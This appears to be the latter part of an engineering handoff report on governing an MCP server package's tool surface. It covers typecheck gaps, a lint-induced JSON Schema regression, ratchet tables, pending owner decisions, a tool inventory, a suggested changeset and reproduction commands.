### F-7 · `packages/tooling` — the home of all 30 validators — is not typechecked, and has 5 type errors 🔴

`yarn typecheck:all` chains tokens, contracts, testing, core, compat, codemods,
mcp and `apps/landing`. **`packages/tooling` is not in it**, although it has a
perfectly good `tsconfig.json`.

Measured now:

```
$ node node_modules/typescript/bin/tsc --noEmit -p packages/tooling/tsconfig.json ; echo $?
… 7 errors …
2
```

**5 of the 7 are on the committed tree at `51dec93`** —
`src/perf-bench.spec.ts` (2), `src/quality/story-dod-triage.ts` (1),
`src/validators/at-matrix.spec.ts` (1), `src/validators/story-dod-tiers.spec.ts`
(1); all four files are TRACKED and CLEAN. The remaining 2 are in
`src/quality/accept-visual-baseline.ts`, which is **untracked** — new in the N1
program's uncommitted work.

**None of the 7 is in a file this task wrote.** `mcp-surface.ts` and
`mcp-surface.spec.ts` are inside that run and produced no errors.

This is the generated-truth apparatus: the ownership generator, the quality
matrix, the capability matrix, the AT matrix, the perf capture, all 30
validators. It is linted and its specs run, but no gate has ever type-checked
it. `story-dod-triage.ts` is production validator code, not a spec.

**Not fixed here** — adding it to `typecheck:all` would turn a green gate red on
5 pre-existing errors, which this program's own discipline forbids a task to do
unasked. → **owner decision D4**.

### F-8 · An eslint rule would have silently changed a published JSON Schema 🟠

While fixing lint on this task's own new code, `regexp/use-ignore-case` demanded
`/^[A-Za-z][A-Za-z0-9]*$/` become `/^[a-z][a-z0-9]*$/i`. Equivalent in
JavaScript. **Not equivalent on the wire**: Zod emits the regex source verbatim
as the JSON Schema `pattern` for `get_component.name`, and JSON Schema's
`pattern` keyword has **no flags** — the "equivalent" form becomes a
case-sensitive, lowercase-only pattern, so any client validating
`{"name":"DzButton"}` against the advertised schema would reject it.

The change was caught **by the freshness gate this task added**, in the same
session, as a one-line diff in `docs/mcp-tool-surface.json`:

```
-      "pattern": "^[A-Za-z][A-Za-z0-9]*$",
+      "pattern": "^[a-z][a-z0-9]*$",
```

Reverted, with an `eslint-disable-next-line` and the reason at the line. **This
is the clearest evidence in this handoff that the gate is load-bearing:** it
caught a published-contract regression introduced by a lint autofix, within an
hour of the gate existing. The generalisation is a live hazard — any `regex()`
whose source is published as a JSON Schema `pattern` is exposed to the same rule.

### F-9 · Ecosystem note: the MCP SDK installs 1.29.0 against a `^1.12.0` range 🟢

`@modelcontextprotocol/sdk` resolves to **1.29.0**; the declared range is
`^1.12.0`. Seventeen minor versions of an evolving protocol SDK, with `zod` at
`3.25.76` against `^3.25.0` while zod 4 is the current major. Nothing here is
broken today — the whole surface was exercised against 1.29.0 in this run — but
the package's floor is a claim no lane tests, which is precisely what
`validate:engines` exists to prevent for Node. → **owner decision D6**.

## 11. Ratchet movements

| Ratchet | Before | After | Direction |
|---|---|---|---|
| `validate:all` links | **29** (T1) | **30** | up, by design — `validate:mcp` added |
| MCP tools with a contract clause | *(uninitialised)* | **9 / 9** | initialised |
| MCP tools with a unit spec | 0 / 9 | **9 / 9** | gap closed |
| MCP tools with a `[malformed]` case | 0 / 9 | **9 / 9** | gap closed |
| MCP tools answering from no data source | **1** (`get_install_command`) | **0** | closed |
| MCP tools with a protocol round-trip | 0 / 9 | **9 / 9** | gap closed |
| **`catalogVisibilityUnreachable`** | *(uninitialised)* | **43** — ceiling, falls only | initialised |
| **`toolsWithoutE2eSmoke`** | *(uninitialised)* | **6** — ceiling, falls only | initialised |
| `@dzup-ui/mcp` tests | **9**, in 0 lanes | **96**, in 2 lanes | up |
| `@dzup-ui/mcp` test files typechecked | **0** | **all** (`tsconfig.test.json`) | up |
| ownership-manifest entries | 1,327 | **1,327 — unchanged** | held, deliberately (§4) |
| capability-matrix rows | 144 | **144 — unchanged** | held, deliberately (§4) |
| unclassified ownership symbols | 29 | **29 — unchanged** | held, deliberately (§4) |

No existing ratchet was moved. No generated artifact outside
`packages/mcp/docs/` was regenerated.

## 12. Unresolved owner decisions

**D1 · Ownership-manifest schema 1.2.0: how is a non-component public surface classified?**
`OwnershipKind` has no value for an MCP server factory, a registry client class
or a pure parser; the manifest is `tier: core` and scoped to
`packages/core/**` + `packages/compat/**`. Options: (a) a new `kind` family
(`tool-surface`, `service-client`, `pure-function`) plus a `generatedFrom`
extension; (b) a **second** manifest per non-component public package, merged the
way the cross-tier map already merges Core and Pro; (c) leave it out and treat
`docs/mcp-tool-surface.json` as the permanent equivalent. This task took (c)
provisionally and did **not** invent a kind. `@dzup-ui/testing`,
`@dzup-ui/codemods` and `@dzup-ui/nuxt` have the same shape and the same gap.

**D2 · Close the 43-component visibility gap.** The fix is upstream:
`public-api.manifest.json` must gain the 43 symbols. B3 records that
`generate:exports` also **drops 5 composables** (`useAffix`, `useCalendar`,
`useInfiniteScroll`, `useScrollSpy`, `useScrollToTop`) and adds 2 — so running it
is a public-API decision, not a refresh. Until it is taken, 30% of the catalog
is invisible to every AI client. This is the highest-value item in this handoff
and it is **not** in this task's authority.

**D3 · Version/changeset for the behaviour changes.** Three observable changes to
a published package: `get_install_command` now returns `isError` for an unknown
item instead of a bogus command; `get_block` / `get_template` /
`get_install_command` now reject non-kebab-case names at the protocol boundary;
unknown arguments are now rejected instead of dropped. Every one narrows a
wrong-input path and none narrows a working call, so **minor** is defensible —
but it is a bump decision, and no changeset was written (N5-01 owns changelog
reconciliation, and 17 changesets are already unreleased). A suggested changeset
body is in §15.

**D4 · Put `packages/tooling` in `typecheck:all`.** Free the moment the 5
committed type errors are fixed (F-7). Not done here because it would turn a
green gate red.

**D5 · Verify the `io.github.datazup/mcp` namespace before the first registry publish.**
`server.json` declares it; `PUBLISHING.md` (now corrected) requires it be a
namespace the publisher controls, verified by GitHub OAuth for that org. Nothing
in the repo can check that. No registry action was taken.

**D6 · `@modelcontextprotocol/sdk` floor.** `^1.12.0` declared, `1.29.0`
installed and tested. Either raise the floor to what is tested, or add an
SDK-floor lane. Same class as ADR-18's Node floor.

**D7 · `dist/tools.js` ships and is unreachable.** Not in the `exports` map, so
Node encapsulates it. Either declare `./tools` — making the tool functions public
API, a real decision — or stop emitting it. Reported as a note, not failed.

**D8 · `packages/mcp/README.md` links `../../DESIGN.md`, which 404s on npm.**
Pre-existing; `validate:mcp` warns. The same pattern may exist in other package
READMEs — unmeasured.

## 13. Ranked next packet

1. **Close D2 — one owner decision plus one generator run.** Take the public-API
   decision on the 5 composables, run `generate:exports`, rebuild the storybook
   llms artifacts, re-run `validate:mcp`, lower the ceiling from 43. Restores 30%
   of the catalog to every AI client — the largest single improvement available
   to the agent surface, and upstream of TASK-N2-A2, A3 and D1.
2. **Fix the 5 committed `packages/tooling` type errors and add it to
   `typecheck:all` (D4, ~1 hour).** Puts 30 validators and every generator inside
   a gate for the first time.
3. **Raise `toolsWithoutE2eSmoke` coverage 6 → 0 (~40 lines in `e2e-smoke.mjs`).**
   Cheap, and it is the only lane that exercises the **published `dist/`** rather
   than source.
4. **Sweep F-3's class repo-wide (~half a day).** A generic
   `validate:package-facts` asserting that every version literal, tool list and
   count inside a package agrees with its `package.json` and its generated
   artifacts. This handoff and T1's are the second and third sightings.
5. **Audit every `z.regex()` / published `pattern` for F-8 (~1 hour).** Any regex
   whose source becomes a JSON Schema `pattern` must not carry flags. Today
   `@dzup-ui/mcp` is the only publisher of JSON Schema in the repo; A2's metadata
   pipeline will add more.
6. **`@dzup-ui/testing`, `@dzup-ui/codemods`, `@dzup-ui/nuxt`** are published and
   have the same governance gap this task closed for `mcp`. D1 covers the
   classification question for all four at once.

## 14. Tool inventory — the surface TASK-N2-A2 will extend

Generated from `packages/mcp/docs/mcp-tool-surface.json`. Nine tools; **no tool
was added by this task**.

| Tool | Input (`*` = required) | Output | Data source (observed) | Spec files |
|---|---|---|---|---|
| `list_components` | `family`, `query` (max 200 chars) | Markdown: `# dzup-ui components (n[ of N])`, `## <Family>` groups, `- **DzX** — desc` | `/storybook/llms.txt` | `tools.spec.ts` · `server.spec.ts` · `tools.contract.spec.ts` |
| `get_component` | `name*` (`^[A-Za-z][A-Za-z0-9]*$`, max 64) | The one `### DzName` section of the full API doc; `isError` + did-you-mean on a miss | `/storybook/llms-full.txt` | `tools.spec.ts` · `server.spec.ts` · `tools.contract.spec.ts` |
| `list_blocks` | `category`, `query` | Markdown list with category · tier · `built from:` | `/r/registry.json` | `tools.spec.ts` · `server.spec.ts` · `tools.contract.spec.ts` |
| `get_block` | `name*` (`^[a-z0-9]+(-[a-z0-9]+)*$`, max 64) | Title, install command, deps, components, one fenced `vue` block per file; `isError` on a miss | `/r/<name>.json` | `tools.spec.ts` · `server.spec.ts` · `tools.contract.spec.ts` · `e2e-smoke.mjs` |
| `list_templates` | `category`, `query` | as `list_blocks`, templates | `/r/templates/registry.json` | `tools.spec.ts` · `server.spec.ts` · `tools.contract.spec.ts` |
| `get_template` | `name*` (registry id) | as `get_block`, templates-scoped URL | `/r/templates/<name>.json` | `tools.spec.ts` · `server.spec.ts` · `tools.contract.spec.ts` |
| `list_tokens` | `theme` (`light` \| `dark`), `query` | One `## <theme> (n)` markdown table per theme, `--dz-*` names | `/r/tokens.json` | `tools.spec.ts` · `server.spec.ts` · `tools.contract.spec.ts` |
| `get_install_command` | `name*` (max 64), `type` (`block` \| `template` \| `tokens`), `packageManager` (`npm` \| `pnpm` \| `yarn` \| `bun`) | Two-step fenced `sh` block + registry URL; `isError` when the item is not in the index | `/r/registry.json` · `/r/templates/registry.json` · `/r/tokens.json` (by `type`) | `tools.spec.ts` · `server.spec.ts` · `tools.contract.spec.ts` |
| `search` | `query*` (max 200) | `# Search "q"` + `## Components/Blocks/Templates (n)` with the next tool to call | `/r/registry.json` · `/r/templates/registry.json` · `/storybook/llms.txt` | `tools.spec.ts` · `server.spec.ts` · `tools.contract.spec.ts` · `e2e-smoke.mjs` |

### Seams A2 should use

A2 extends this surface from a new `vue-component-meta` artifact. The seams are
deliberate and named:

1. **`RegistryClient` is the only data layer.** Add a method there (e.g.
   `componentMeta(name)`) reading the new artifact by site path; every tool then
   reaches it the same way, and the recording reader in
   `src/__fixtures__/catalog.ts` observes it for free.
2. **Add the artifact's site path to `FIXTURE_FILES`.** The generator prints a
   note for a fixture path no probe reads, so an unused fixture is visible.
3. **A new tool needs four things, and a gate names each one if it is missing:**
   a `PROBES` entry (contract clause C8), a top-level `describe('<name>')` in
   `tools.spec.ts` (C8 and `validate:mcp`), an `it('[malformed] …')` inside it
   (`validate:mcp`), and a `ROUND_TRIPS` row in `server.spec.ts`. Then
   `yarn generate:mcp-surface`, and the artifact, the README table and the
   evidence matrix update themselves.
4. **`get_component` currently answers from `/storybook/llms-full.txt`.** If A2
   repoints it at the metadata artifact, `dataSource.readPatterns` changes and
   the freshness gate forces the README table to follow — intended behaviour, not
   an obstacle.
5. **Do not raise `catalogVisibilityUnreachable`.** If A2's artifact is generated
   from the same stale `public-api.manifest.json`, it inherits F-1. Generating it
   from the **ownership manifest** instead would close D2 as a side effect —
   worth deciding explicitly rather than by default.

## 15. Suggested changeset for D3 (not written to `.changeset/`)

```md
---
'@dzup-ui/mcp': minor
---

Govern the MCP tool surface (TASK-N2-A1).

- The server now reports the version from `package.json` instead of a literal
  that had been `0.1.0` since before the 0.2.0 release; `server.json` agrees.
- `get_block`, `get_template` and `get_install_command` validate the item name
  as a registry id at the protocol boundary. An unvalidated name was
  interpolated into the `shadcn add` command these tools print.
- `get_install_command` verifies the item exists in the generated registry
  before printing a command, instead of building a URL from a template.
- Every tool now enforces the `additionalProperties: false` its published JSON
  Schema already advertised.
- New: `isRegistryId`, `REGISTRY_ID_RE`, `REGISTRY_ID_MAX_LENGTH` on
  `@dzup-ui/mcp/registry`; `docs/mcp-tool-surface.json` ships in the tarball.
```

## Appendix — reproduction

```sh
# the surface artifact + the generated README table
yarn generate:mcp-surface
npx tsx packages/mcp/scripts/generate-tool-surface.ts --check   # freshness only

# the gate
yarn validate:mcp

# focused tests, both lanes
npx vitest run --root packages/mcp        # package config, node env
npx vitest run packages/mcp               # root config -- what CI runs
npx vitest run packages/tooling/src/validators/mcp-surface.spec.ts

# the published artifact
yarn workspace @dzup-ui/mcp build
node packages/mcp/scripts/e2e-smoke.mjs

# the aggregate
yarn typecheck:all && yarn lint && yarn validate:all
```
